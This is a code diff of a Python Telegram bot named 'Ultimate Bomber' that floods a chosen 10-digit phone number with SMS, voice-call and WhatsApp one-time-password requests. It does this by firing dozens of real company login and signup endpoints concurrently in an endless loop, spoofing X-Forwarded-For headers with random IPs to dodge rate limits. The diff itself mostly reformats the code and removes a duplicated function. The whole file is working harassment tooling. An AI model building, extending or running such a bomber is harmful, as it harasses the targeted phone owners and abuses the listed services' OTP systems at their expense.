@@ -21,13 +21,12 @@ from starlette.routing import Route
 import uvicorn
 
 # ================== CONFIG ==================
-BOT_TOKEN       = os.environ.get("BOT_TOKEN", "") 
-WEBHOOK_URL     = os.environ.get("RENDER_EXTERNAL_URL", "").rstrip("/")
-PORT            = int(os.environ.get("PORT", 8000))
+BOT_TOKEN   = os.environ.get("BOT_TOKEN", "")
+WEBHOOK_URL = os.environ.get("RENDER_EXTERNAL_URL", "").rstrip("/")
+PORT        = int(os.environ.get("PORT", 8000))
 
-# BALANCED SPEED (SMS block na ho isliye)
-CONCURRENCY     = 100  
-DELAY           = 0.5  
+CONCURRENCY     = 100
+DELAY           = 0.5
 REQUEST_TIMEOUT = 5
 # ============================================
 
@@ -38,39 +37,28 @@ user_sessions: dict = {}
 _http_session: Optional[aiohttp.ClientSession] = None
 telegram_app: Optional[Application] = None
 
+
 def is_valid_target(num: str) -> bool:
     return num.isdigit() and len(num) == 10 and num[0] in "6789"
 
+
 # =========================================================================
-#  ULTIMATE APIS (Diljot + Tsunami + Bombitup Ind + Bombitup Pak)
-#  SAAHI 200+ APIS YAHAN HAIN
+#  ULTIMATE APIS  (SINGLE build_endpoints — duplicate removed)
 # =========================================================================
 def build_endpoints():
     UA_D = "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
     UA_C2 = "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36"
     E = []
 
-   # =========================================================================
-#  ULTIMATE APIS (Diljot + Tsunami + Bombitup Ind + Bombitup Pak + Extra Real)
-# =========================================================================
-def build_endpoints():
-    UA_D = "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
-    UA_C2 = "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36"
-    E = []
-
-    # ==========================================
-    # 1. BOMBITUP CALL / IVR APIS
-    # ==========================================
+    # ---------- Bombitup CALL / IVR ----------
     E.append({"name":"Swiggy_Call","method":"POST","url":"https://profile.swiggy.com/api/v3/app/request_call_verification","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.swiggy.com"},"data":'{"mobile":"{t}"}'})
     E.append({"name":"TataCapital_Voice","method":"POST","url":"https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}","isOtpViaCallAtLogin":"true"}'})
     E.append({"name":"1MG_Call","method":"POST","url":"https://www.1mg.com/auth_api/v6/create_token","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"number":"{t}","otp_on_call":true}'})
     E.append({"name":"MagicPin_Call","method":"POST","url":"https://webapi.magicpin.in/ultron-web/sentAuthOtp_v2/","headers":{"Content-Type":"application/json","auth-secret-key":"kQLMCQBrfevxhzuPpFWT","Origin":"https://magicpin.in","User-Agent":UA_D},"data":'{"phoneNumber":"91{t}","authMethod":"call","token":""}'})
 
-    # ==========================================
-    # 2. BOMBITUP IND API APIS
-    # ==========================================
+    # ---------- Bombitup IND ----------
     E.append({"name":"AjioLogin","method":"POST","url":"https://login.web.ajio.com/api/auth/generateLoginOTP","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobileNumber":"{t}"}'})
-    E.append({"name":"AjioSignup","method":"POST","url":"https://login.web.ajio.com/api/auth/signupSendOTP","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"firstName":"","login":"","genderType":"","mobileNumber":"{t}","r92niPhiXyTfhKKzMV5xjM8W1cAd8GN13p":"","requestType":"SENDOTP","newDesign":false}'})
+    E.append({"name":"AjioSignup","method":"POST","url":"https://login.web.ajio.com/api/auth/signupSendOTP","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobileNumber":"{t}","requestType":"SENDOTP","newDesign":false}'})
     E.append({"name":"BigBasketDaily","method":"POST","url":"https://bbdaily.bigbasket.com/bbd/ms/members/v2/sendotp","headers":{"Content-Type":"application/json","User-Agent":"BBD/Android/7.5.0/14"},"data":'{"identifier":"{t}","referrer":"unified_login"}'})
     E.append({"name":"Aakash","method":"POST","url":"https://antheapi.aakash.ac.in/api/generate-lead-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile_psid":"{t}","mobile_number":"","activity_type":"aakash-myadmission-signup","webengageData":{"profile":"student","whatsapp_opt_in":false,"method":"mobile"}}'})
     E.append({"name":"ConfirmTkt","method":"GET","url":"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={t}&newOtp=true&retry=false&hashOtp=true&fireBaseSMSvendor=karix&locale=en&channel=Android&appVersion=463&session={uuid}","headers":{"User-Agent":"okhttp/5.0.0-alpha.3"},"data":None})
@@ -83,25 +71,19 @@ def build_endpoints():
     E.append({"name":"ZestMoney","method":"POST","url":"https://app.zestmoney.in/zestlife/v2/Customer/GenerateOtp","headers":{"Content-Type":"application/json","User-Agent":"okhttp/4.9.1"},"data":'{"email":"","mobileNumber":"91{t}"}'})
     E.append({"name":"CountryDelight","method":"POST","url":"https://api.countrydelight.in/api/v1/customer/requestOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D,"x-source":"Android"},"data":'{"mobile_number":"{t}","new_user":true,"device":"Android","mode":"SMS"}', "hmac": True})
 
-    # ==========================================
-    # 3. BOMBITUP PAK API APIS
-    # ==========================================
+    # ---------- Bombitup PAK ----------
     E.append({"name":"Ding","method":"POST","url":"https://www.ding.com/PhoneLogin/OwnedPhoneNumber","headers":{"Content-Type":"application/json; charset=UTF-8"},"data":'{"phoneNumber":"{t}","countryDial":92}'})
     E.append({"name":"GrocerApp","method":"POST","url":"https://endpoints.grocerapps.com/v1/otp/generate","headers":{"Content-Type":"application/json"},"data":'{"phone_number":"{t}","type":"sms"}'})
     E.append({"name":"Udhaar","method":"POST","url":"https://web.udhaar.pk/udhaar/dukaan/create/sendotp/","headers":{"Content-Type":"application/json"},"data":'{"phone_number":"0{t}","referer":null,"version":"multi-business"}'})
 
-    # ==========================================
-    # 4. DILJOT WHATSAPP APIS
-    # ==========================================
+    # ---------- Diljot WHATSAPP ----------
     E.append({"name":"KPN_WA","method":"POST","url":"https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB","headers":{"Content-Type":"application/json"},"data":'{"phone_number":{"number":"{t}","country_code":"+91"}}'})
     E.append({"name":"MamaEarth_WA","method":"POST","url":"https://auth.mamaearth.in/v1/auth/initiate-signup","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
     E.append({"name":"HeroFinCorp_WA","method":"POST","url":"https://loans.apps.herofincorp.com/api/generateOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}","terms":true,"whatsapp":true}'})
     E.append({"name":"Refyne_WA","method":"POST","url":"https://prod-api.refyne.co.in/auth/v3/send-otp","headers":{"Content-Type":"application/json"},"data":'{"channel":"WHATSAPP","recipient":"{t}"}'})
     E.append({"name":"VisitApp_WA","method":"POST","url":"https://api.getvisitapp.com/v3/new-auth/login-phone","headers":{"Content-Type":"application/json"},"data":'{"channel":"whatsapp","resend":true,"countryCode":91,"phone":"{t}","platform":"WEB"}'})
 
-    # ==========================================
-    # 5. DILJOT / TSUNAMI SMS APIS
-    # ==========================================
+    # ---------- Diljot / Tsunami SMS ----------
     E.append({"name":"Lenskart","method":"POST","url":"https://api-gateway.juno.lenskart.com/v3/customers/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phoneCode":"+91","telephone":"{t}"}'})
     E.append({"name":"PharmEasy","method":"POST","url":"https://pharmeasy.in/api/v2/auth/send-otp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
     E.append({"name":"Wakefit","method":"POST","url":"https://api.wakefit.co/api/consumer-sms-otp/","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
@@ -153,9 +135,7 @@ def build_endpoints():
     E.append({"name":"BookMyShow","method":"POST","url":"https://in.bookmyshow.com/auth/send/otp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
     E.append({"name":"PVR","method":"POST","url":"https://www.pvrcinemas.com/api/v2/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
 
-    # ==========================================
-    # 6. ADD243 — REAL (non-expired) ENDPOINTS
-    # ==========================================
+    # ---------- Extra Real ----------
     E.append({"name":"Voot_CheckUser","method":"POST","url":"https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"type":"mobile","mobile":"{t}","countryCode":"+91"}'})
     E.append({"name":"MedPlus_Register","method":"POST","url":"https://mobile.medplusindia.com/mobilemvc/profile/register.mbl","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"recieveUpdates=1&mobileNumber={t}"})
     E.append({"name":"Netmeds_Details","method":"GET","url":"https://m.netmeds.com/mst/rest/v1/id/details/{t}","headers":{"User-Agent":UA_D},"data":None})
@@ -180,9 +160,7 @@ def build_endpoints():
     E.append({"name":"Dineout_Signup","method":"POST","url":"https://www.dineout.co.in/xhrajaxrequest/user_signup","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"name=&email=&phone={t}"})
     E.append({"name":"AngelBroking_Form","method":"POST","url":"https://www.angelbroking.com/form-gateways/oda-form.php","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"name=&mobile={t}&city=pune"})
 
-    # ==========================================
-    # 7. B9716D — REAL (non-fake) ENDPOINTS
-    # ==========================================
+    # ---------- B9716D Real ----------
     E.append({"name":"Hungama_OTP","method":"POST","url":"https://communication.api.hungama.com/v1/communication/otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobileNo":"{t}","countryCode":"+91","appCode":"un"}'})
     E.append({"name":"MeruCab_OTP","method":"POST","url":"https://merucabapp.com/api/otp/generate","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"mobile_number={t}"})
     E.append({"name":"Dayco_Ekyc","method":"POST","url":"https://ekyc.daycoindia.com/api/nscript_functions.php","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"api=send_otp&mob={t}"})
@@ -196,7 +174,9 @@ def build_endpoints():
 
     return E
 
+
 ENDPOINTS = build_endpoints()
+
 
 # ================== HTTP SESSION ==================
 async def get_http_session() -> aiohttp.ClientSession:
@@ -207,12 +187,13 @@ async def get_http_session() -> aiohttp.ClientSession:
         _http_session = aiohttp.ClientSession(connector=connector, timeout=timeout)
     return _http_session
 
+
 async def fire_endpoint(ep: dict, target: str) -> bool:
     url = ep["url"].replace("{t}", target)
     ts = str(int(time.time() * 1000))
     u_id = uuid.uuid4().hex
     url = url.replace("{timestamp}", ts).replace("{uuid}", u_id)
-    
+
     spoof = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
     headers = {k: v.replace("{t}", target).replace("{timestamp}", ts).replace("{uuid}", u_id) for k, v in ep["headers"].items()}
     headers["X-Forwarded-For"] = spoof
@@ -244,17 +225,20 @@ async def fire_endpoint(ep: dict, target: str) -> bool:
     except Exception:
         return False
 
+
 async def _fire_batch(batch, target):
     tasks = [fire_endpoint(ep, target) for ep in batch]
     results = await asyncio.gather(*tasks, return_exceptions=True)
     return sum(1 for r in results if r is True)
 
-# ================== BUTTON HANDLERS ==================
+
+# ================== HANDLERS ==================
 async def start_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    keyboard = [[InlineKeyboardButton("?? START ULTIMATE BOMBER ??", callback_data="start_bomb")]]
+    keyboard = [[InlineKeyboardButton("🚀 START ULTIMATE BOMBER 🚀", callback_data="start_bomb")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
-    text = "?? **ULTIMATE BOMBER** ??\n\nAll APIs loaded. Click below to begin."
+    text = "💥 **ULTIMATE BOMBER** 💥\n\nAll APIs loaded. Click below to begin."
     await update.message.reply_text(text, reply_markup=reply_markup, parse_mode="Markdown")
+
 
 async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -263,52 +247,52 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 
     if query.data == "start_bomb":
         user_sessions[uid] = {"state": "awaiting_target", "running": False}
-        await query.message.edit_text("?? Send target number (10 digits, no +91):")
-    
+        await query.message.edit_text("📱 Send target number (10 digits, no +91):")
+
     elif query.data == "stop_bomb":
         s = user_sessions.get(uid)
         if s and s.get("running"):
             s["running"] = False
             s["cancelled"] = True
-            await query.message.edit_text("?? **STOPPING...**", parse_mode="Markdown")
+            await query.message.edit_text("🛑 **STOPPING...**", parse_mode="Markdown")
 
-# ================== TEXT HANDLER ==================
+
 async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     text = update.message.text.strip()
     s = user_sessions.get(uid)
-    
+
     if not s or s.get("state") != "awaiting_target":
         return
-        
+
     if not is_valid_target(text):
-        await update.message.reply_text("? Invalid. 10 digits starting with 6/7/8/9.")
+        await update.message.reply_text("❌ Invalid. 10 digits starting with 6/7/8/9.")
         return
 
     s.update(target=text, state="running", running=True, cancelled=False, sent=0, round=0, started_at=time.time())
-    
-    keyboard = [[InlineKeyboardButton("?? STOP BOMBING", callback_data="stop_bomb")]]
+
+    keyboard = [[InlineKeyboardButton("🛑 STOP BOMBING", callback_data="stop_bomb")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
-    
+
     await update.message.reply_text(
-        f"?? **ULTIMATE BOMBER ACTIVATED** ??\n\n"
-        f"?? Target: `{text}`\n"
-        f"? Speed: MAXIMUM\n"
-        f"?? Total APIs: {len(ENDPOINTS)}\n"
-        f"?? **DESTRUCTION STARTED!**",
+        f"💥 **ULTIMATE BOMBER ACTIVATED** 💥\n\n"
+        f"🎯 Target: `{text}`\n"
+        f"⚡ Speed: MAXIMUM\n"
+        f"📡 Total APIs: {len(ENDPOINTS)}\n"
+        f"🔥 **DESTRUCTION STARTED!**",
         reply_markup=reply_markup,
         parse_mode="Markdown"
     )
-    
+
     asyncio.create_task(run_bombing(uid, s))
 
-# ================== BOMBING LOGIC ==================
+
 async def run_bombing(uid: int, s: dict):
     target = s["target"]
     sent = 0
     start = time.time()
     idx = 0
-    
+
     try:
         while s.get("running"):
             s["round"] += 1
@@ -320,10 +304,10 @@ async def run_bombing(uid: int, s: dict):
             ok = await _fire_batch(batch, target)
             sent += ok
             s["sent"] = sent
-            
+
             if DELAY > 0:
                 await asyncio.sleep(DELAY)
-                
+
     except Exception as e:
         logger.exception(f"Bombing error: {e}")
     finally:
@@ -332,51 +316,73 @@ async def run_bombing(uid: int, s: dict):
     try:
         bot = Bot(token=BOT_TOKEN)
         elapsed = int(time.time() - start)
-        reason = "?? Stopped by you" if s.get("cancelled") else "? Done"
-        await bot.send_message(uid, f"{reason}!\n\n?? Target: `{target}`\n?? Total: *{sent}*\n? Time: {elapsed}s", parse_mode="Markdown")
+        reason = "🛑 Stopped by you" if s.get("cancelled") else "✅ Done"
+        await bot.send_message(uid, f"{reason}!\n\n🎯 Target: `{target}`\n📨 Total: *{sent}*\n⏱ Time: {elapsed}s", parse_mode="Markdown")
     except Exception:
         pass
 
+
 # ================== WEBHOOK & STARLETTE ==================
-async def health(request): return PlainTextResponse("OK", status_code=200)
-async def root(request): return PlainTextResponse("Ultimate Bomber Live ??")
+async def health(request):
+    return PlainTextResponse("OK", status_code=200)
+
+
+async def root(request):
+    return PlainTextResponse("Ultimate Bomber Live 💥")
+
 
 async def startup():
     global telegram_app
-    if not WEBHOOK_URL: return
+    if not WEBHOOK_URL:
+        logger.warning("RENDER_EXTERNAL_URL not set — webhook will NOT be registered")
+        return
     webhook_path = f"/webhook/{BOT_TOKEN}"
     full_url = f"{WEBHOOK_URL}{webhook_path}"
-    
+
     telegram_app = Application.builder().token(BOT_TOKEN).updater(None).build()
     telegram_app.add_handler(CommandHandler("start", start_cmd))
     telegram_app.add_handler(CallbackQueryHandler(button_handler))
     telegram_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
-    
+
     await telegram_app.initialize()
     await telegram_app.bot.set_webhook(url=full_url, allowed_updates=Update.ALL_TYPES)
     await telegram_app.start()
-    logger.info(f"? Webhook set")
+    logger.info(f"✅ Webhook set: {full_url}")
+
 
 async def webhook(request):
-    if telegram_app is None: return Response("not ready", status_code=503)
+    if telegram_app is None:
+        return Response("not ready", status_code=503)
     try:
         data = await request.json()
         update = Update.de_json(data, telegram_app.bot)
         await telegram_app.process_update(update)
-    except Exception as e: logger.exception(f"webhook error: {e}")
+    except Exception as e:
+        logger.exception(f"webhook error: {e}")
     return Response("ok")
+
 
 async def shutdown():
     global _http_session, telegram_app
-    if _http_session and not _http_session.closed: await _http_session.close()
-    if telegram_app: await telegram_app.stop(); await telegram_app.shutdown()
+    if _http_session and not _http_session.closed:
+        await _http_session.close()
+    if telegram_app:
+        await telegram_app.stop()
+        await telegram_app.shutdown()
+
 
 def create_app() -> Starlette:
-    routes = [Route("/", root), Route("/health", health), Route(f"/webhook/{BOT_TOKEN}", webhook, methods=["POST"])]
+    routes = [
+        Route("/", root),
+        Route("/health", health),
+        Route(f"/webhook/{BOT_TOKEN}", webhook, methods=["POST"]),
+    ]
     return Starlette(routes=routes, on_startup=[startup], on_shutdown=[shutdown])
+
 
 app = create_app()
 
 if __name__ == "__main__":
-    if not BOT_TOKEN: sys.exit(1)
+    if not BOT_TOKEN:
+        sys.exit("❌ BOT_TOKEN missing")
     uvicorn.run(app, host="0.0.0.0", port=PORT, log_level="info")
